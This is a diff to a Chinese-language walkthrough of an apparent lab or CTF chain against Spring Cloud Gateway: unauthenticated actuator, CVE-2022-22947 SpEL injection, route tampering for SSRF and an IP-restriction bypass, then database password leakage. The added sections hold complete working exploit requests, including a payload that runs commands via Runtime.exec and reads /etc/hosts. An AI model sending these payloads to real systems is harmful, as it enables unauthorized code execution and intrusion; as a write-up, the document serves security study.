@@ -5,15 +5,87 @@
 第二个是SpringCloud Gateway，也有`/actuator`路由，而且是未授权访问。可以访问`/actuator/gateway/routes`获取到gateway转发的地址，从而访问`/oasystem`打第一个web服务的SSRF
 
 通过SSRF第一个web服务的`/actuator`，一可以打MySQL JDBC 反序列化（不单单是这个，还有其他手法RCE）直接RCE，二可以打`/actuator/jolokia`，造成数据库密码泄露
-RCE之后可以直接拿数据库密码连接MySQL托库
+RCE之后可以直接拿数据库密码连接MySQL
 
 ![](../images/oasystem.png)
 
-## API interface leak  &&  SSRF
+## API unauth
 
-扫Gateway服务的目录得到`/actuator`未授权访问，以及转发流量的路由
+使用APIKit扫描Gateway服务的API接口，得到`/actuator`未授权访问。使用CVE-2022-22947，进行RCE：
+
+```http
+POST /actuator/gateway/routes/test1 HTTP/1.1
+Host: localhost:8000
+Content-Length: 427
+Content-Type: application/json
+Connection: close
+
+{
+    "id": "test1",
+    "filters": [
+        {
+            "name": "AddResponseHeader",
+            "args": {
+                "value": "#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"whoami\"}).getInputStream()))}",
+                "name": "cmd"
+            }
+        }
+    ],
+    "uri": "http://aaa.com",
+    "order": 2
+}
+
+```
+
+得到返回`HTTP/1.1 201 Created`之后，POST访问`/actuator/gateway/refresh`再GET访问`/actuator/gateway/routes/test1`可以得到命令执行的回显。
+
+
+
+## tamper routes &&  SSRF
+
+使用SPEL表达式注入，读取`/etc/hosts`文件发现有这么一行：
+
+```
+oasystem    172.192.1.10
+```
+
+于是我们知道了第一个服务的hosts以及内网IP地址，可以动态修改Gateway的路由来进行SSRF：
+
+```http
+POST /actuator/gateway/routes/oasystem HTTP/1.1
+Host: localhost:8000
+Connection: close
+Content-Type: application/json
+Content-Length: 404
+
+{
+    "id": "oasystem",
+    "uri": "http://oasystem:8080",
+    "filters": [
+        {
+            "name": "PreserveHostHeader",
+            "args": {
+                "_genkey_0": ""
+            }
+        }
+    ],
+    "predicates": [
+        {
+            "name": "Path",
+            "args": {
+                "_genkey_0": "/oasystem/**"
+            }
+        }
+    ],
+    "order": 0
+}
+```
+
+再POST `/actuator/gateway/refresh`，进行路由配置的刷新，之后就可以在`/actuator/gateway/routes/`看到我们添加的路由了：
 
 ![](../images/oasystem_2.png)
+
+访问Gateway服务的`/oasystem/actuator`路由即可绕过SpringSecurity的IP限制
 
 ## MySQL passwd leak
 
@@ -39,6 +111,8 @@ Content-Length: 205
     ]
 }
 ```
+
+
 
 ## MySQL JDBC deserialization to RCE
 
